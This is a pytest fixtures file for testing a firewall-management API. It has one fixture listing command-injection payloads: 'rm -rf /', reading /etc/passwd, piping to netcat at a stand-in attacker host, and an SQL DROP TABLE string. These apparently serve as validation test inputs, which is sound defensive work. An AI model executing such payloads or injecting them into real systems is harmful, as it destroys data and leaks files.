"""
Shared pytest fixtures for firewall management tests

This file provides common fixtures used across both unit and integration tests.
To use these fixtures in your tests, pytest will automatically discover them.
"""
import pytest
import asyncio
import httpx
from typing import Dict, Any, AsyncGenerator
from pathlib import Path
import os


# ==================== ASYNC EVENT LOOP CONFIGURATION ====================

@pytest.fixture(scope="session")
def event_loop():
    """Create an event loop for async tests"""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


# ==================== BASE URL CONFIGURATION ====================

@pytest.fixture(scope="session")
def ops_center_base_url():
    """Base URL for Ops-Center API"""
    return os.getenv("OPS_CENTER_URL", "http://localhost:8084")


# ==================== TEST USER CREDENTIALS ====================

@pytest.fixture(scope="session")
def admin_credentials():
    """Admin user credentials for testing"""
    return {
        "username": os.getenv("TEST_ADMIN_USERNAME", "admin_test"),
        "password": os.getenv("TEST_ADMIN_PASSWORD", "Test123!")
    }


@pytest.fixture(scope="session")
def moderator_credentials():
    """Moderator user credentials for testing"""
    return {
        "username": os.getenv("TEST_MODERATOR_USERNAME", "moderator_test"),
        "password": os.getenv("TEST_MODERATOR_PASSWORD", "Test123!")
    }


@pytest.fixture(scope="session")
def viewer_credentials():
    """Viewer (non-admin) user credentials for testing"""
    return {
        "username": os.getenv("TEST_VIEWER_USERNAME", "user_test"),
        "password": os.getenv("TEST_VIEWER_PASSWORD", "Test123!")
    }


# ==================== HTTP CLIENTS ====================

@pytest.fixture
async def admin_client(ops_center_base_url, admin_credentials) -> AsyncGenerator:
    """Create authenticated admin HTTP client"""
    async with httpx.AsyncClient(
        base_url=ops_center_base_url,
        timeout=10.0,
        follow_redirects=True
    ) as client:
        # Login as admin
        try:
            response = await client.post(
                "/api/v1/auth/login",
                json=admin_credentials
            )

            if response.status_code == 200:
                data = response.json()
                token = data.get("access_token") or data.get("token")

                if token:
                    client.headers["Authorization"] = f"Bearer {token}"

        except Exception as e:
            print(f"Admin login failed: {e}")

        yield client


@pytest.fixture
async def moderator_client(ops_center_base_url, moderator_credentials) -> AsyncGenerator:
    """Create authenticated moderator HTTP client"""
    async with httpx.AsyncClient(
        base_url=ops_center_base_url,
        timeout=10.0,
        follow_redirects=True
    ) as client:
        try:
            response = await client.post(
                "/api/v1/auth/login",
                json=moderator_credentials
            )

            if response.status_code == 200:
                data = response.json()
                token = data.get("access_token") or data.get("token")

                if token:
                    client.headers["Authorization"] = f"Bearer {token}"

        except Exception as e:
            print(f"Moderator login failed: {e}")

        yield client


@pytest.fixture
async def viewer_client(ops_center_base_url, viewer_credentials) -> AsyncGenerator:
    """Create authenticated viewer (non-admin) HTTP client"""
    async with httpx.AsyncClient(
        base_url=ops_center_base_url,
        timeout=10.0,
        follow_redirects=True
    ) as client:
        try:
            response = await client.post(
                "/api/v1/auth/login",
                json=viewer_credentials
            )

            if response.status_code == 200:
                data = response.json()
                token = data.get("access_token") or data.get("token")

                if token:
                    client.headers["Authorization"] = f"Bearer {token}"

        except Exception as e:
            print(f"Viewer login failed: {e}")

        yield client


@pytest.fixture
async def unauthenticated_client(ops_center_base_url) -> AsyncGenerator:
    """Create HTTP client without authentication"""
    async with httpx.AsyncClient(
        base_url=ops_center_base_url,
        timeout=10.0,
        follow_redirects=True
    ) as client:
        yield client


# ==================== TEST DATA ====================

@pytest.fixture
def valid_firewall_rule():
    """Valid firewall rule for testing"""
    return {
        "action": "allow",
        "direction": "in",
        "protocol": "tcp",
        "port": 8080,
        "comment": "TEST: Valid firewall rule"
    }


@pytest.fixture
def valid_deny_rule():
    """Valid deny rule for testing"""
    return {
        "action": "deny",
        "protocol": "tcp",
        "port": 3389,
        "comment": "TEST: Block RDP"
    }


@pytest.fixture
def valid_rule_with_ip():
    """Valid rule with source IP restriction"""
    return {
        "action": "allow",
        "protocol": "tcp",
        "port": 5432,
        "source_ip": "192.168.1.0/24",
        "comment": "TEST: PostgreSQL (internal only)"
    }


@pytest.fixture
def invalid_port_rule():
    """Invalid rule (port out of range)"""
    return {
        "action": "allow",
        "protocol": "tcp",
        "port": 70000,
        "comment": "TEST: Invalid port"
    }


@pytest.fixture
def invalid_ip_rule():
    """Invalid rule (malformed IP)"""
    return {
        "action": "allow",
        "protocol": "tcp",
        "port": 8080,
        "source_ip": "999.999.999.999",
        "comment": "TEST: Invalid IP"
    }


@pytest.fixture
def command_injection_attempts():
    """List of command injection payloads for testing"""
    return [
        "8080; rm -rf /",
        "8080 && cat /etc/passwd",
        "8080 | nc attacker.com 1234",
        "8080`whoami`",
        "8080$(id)",
        "'; DROP TABLE firewall_rules; --"
    ]


# ==================== CLEANUP FIXTURES ====================

@pytest.fixture(autouse=True)
async def cleanup_test_firewall_rules(admin_client):
    """
    Automatically cleanup test firewall rules after each test

    This fixture runs automatically for all tests and removes
    any rules created during testing (identified by "TEST:" in comment)
    """
    # BEFORE test: nothing to do
    yield

    # AFTER test: cleanup
    try:
        response = await admin_client.get("/api/v1/network/firewall/rules")

        if response.status_code == 200:
            data = response.json()
            rules = data.get("rules", [])

            # Delete all test rules
            for rule in rules:
                comment = rule.get("comment", "")
                if comment and "TEST:" in comment:
                    rule_id = rule.get("rule_id")
                    if rule_id:
                        await admin_client.delete(
                            f"/api/v1/network/firewall/rules/{rule_id}",
                            params={"force": True}  # Force delete even if SSH
                        )

    except Exception as e:
        # Cleanup errors are non-fatal
        print(f"Warning: Cleanup error: {e}")


@pytest.fixture
def mock_ufw_status_output():
    """Mock UFW status output for unit tests"""
    return """Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), disabled (routed)

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW       Anywhere
80/tcp                     ALLOW       Anywhere
443/tcp                    ALLOW       Anywhere
8080/tcp                   ALLOW       Anywhere
5432/tcp                   ALLOW       192.168.1.0/24"""


@pytest.fixture
def mock_ufw_status_inactive():
    """Mock UFW inactive status"""
    return "Status: inactive"


@pytest.fixture
def mock_ufw_numbered_output():
    """Mock UFW numbered rules output"""
    return """Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 80/tcp                     ALLOW IN    Anywhere
[ 3] 443/tcp                    ALLOW IN    Anywhere
[ 4] 8080/tcp                   ALLOW IN    Anywhere
[ 5] 5432/tcp                   ALLOW IN    192.168.1.0/24"""


# ==================== DATABASE FIXTURES ====================

@pytest.fixture
async def db_connection():
    """
    Database connection for testing

    Note: This is a placeholder. Implement actual database connection
    based on your database setup (PostgreSQL, SQLite, etc.)
    """
    # TODO: Implement database connection
    # For now, return None
    yield None


@pytest.fixture
async def clean_database(db_connection):
    """
    Clean database before and after tests

    Removes all test data from firewall_rules and audit_logs tables
    """
    # BEFORE test: cleanup
    if db_connection:
        # TODO: Implement database cleanup
        # await db_connection.execute("DELETE FROM firewall_rules WHERE comment LIKE 'TEST:%'")
        # await db_connection.execute("DELETE FROM audit_logs WHERE operation LIKE 'test_%'")
        pass

    yield

    # AFTER test: cleanup again
    if db_connection:
        # TODO: Implement database cleanup
        pass


# ==================== ENVIRONMENT SETUP ====================

@pytest.fixture(scope="session", autouse=True)
def setup_test_environment():
    """
    Setup test environment before running any tests

    This runs once at the start of the test session
    """
    # Set test environment variables
    os.environ["ENVIRONMENT"] = "test"
    os.environ["LOG_LEVEL"] = "DEBUG"

    print("\n" + "="*60)
    print("FIREWALL MANAGEMENT TEST SUITE")
    print("="*60)
    print(f"Ops-Center URL: {os.getenv('OPS_CENTER_URL', 'http://localhost:8084')}")
    print(f"Test Environment: {os.getenv('ENVIRONMENT', 'test')}")
    print("="*60 + "\n")

    yield

    # Teardown
    print("\n" + "="*60)
    print("TEST SUITE COMPLETED")
    print("="*60 + "\n")


# ==================== PYTEST MARKERS ====================

def pytest_configure(config):
    """
    Register custom pytest markers

    Usage in tests:
        @pytest.mark.requires_ufw
        def test_something():
            pass
    """
    config.addinivalue_line(
        "markers", "requires_ufw: marks tests as requiring UFW to be installed"
    )
    config.addinivalue_line(
        "markers", "requires_sudo: marks tests as requiring sudo permissions"
    )
    config.addinivalue_line(
        "markers", "slow: marks tests as slow (> 1 second)"
    )
    config.addinivalue_line(
        "markers", "destructive: marks tests that modify system state"
    )
    config.addinivalue_line(
        "markers", "integration: marks tests as integration tests"
    )
    config.addinivalue_line(
        "markers", "unit: marks tests as unit tests"
    )


# ==================== HELPER FIXTURES ====================

@pytest.fixture
def assert_valid_firewall_status():
    """Helper to assert valid firewall status response"""
    def _assert(data: Dict[str, Any]):
        assert "enabled" in data
        assert isinstance(data["enabled"], bool)

        if "default_incoming" in data:
            assert data["default_incoming"] in ["allow", "deny"]

        if "default_outgoing" in data:
            assert data["default_outgoing"] in ["allow", "deny"]

        if "rules_count" in data:
            assert isinstance(data["rules_count"], int)
            assert data["rules_count"] >= 0

        if "rules" in data:
            assert isinstance(data["rules"], list)

    return _assert


@pytest.fixture
def assert_valid_firewall_rule():
    """Helper to assert valid firewall rule structure"""
    def _assert(rule: Dict[str, Any]):
        assert "rule_id" in rule or "num" in rule
        assert "action" in rule
        assert rule["action"] in ["allow", "deny", "ALLOW", "DENY"]
        assert "protocol" in rule
        assert rule["protocol"] in ["tcp", "udp", "both"]
        assert "port" in rule
        assert isinstance(rule["port"], (int, str))

    return _assert


# ==================== SKIP CONDITIONS ====================

@pytest.fixture
def skip_if_ufw_not_installed():
    """Skip test if UFW is not installed"""
    import shutil
    if not shutil.which("ufw"):
        pytest.skip("UFW is not installed")


@pytest.fixture
def skip_if_no_sudo():
    """Skip test if running without sudo privileges"""
    import os
    if os.geteuid() != 0:
        pytest.skip("Test requires sudo privileges")


# ==================== PERFORMANCE MONITORING ====================

@pytest.fixture
def performance_monitor():
    """Monitor test performance"""
    import time

    class PerformanceMonitor:
        def __init__(self):
            self.start_time = None
            self.end_time = None

        def start(self):
            self.start_time = time.time()

        def stop(self):
            self.end_time = time.time()

        @property
        def duration(self):
            if self.start_time and self.end_time:
                return self.end_time - self.start_time
            return None

        def assert_duration_under(self, max_seconds: float):
            assert self.duration is not None, "Timer not started/stopped"
            assert self.duration < max_seconds, \
                f"Operation took {self.duration:.3f}s (expected < {max_seconds}s)"

    return PerformanceMonitor()
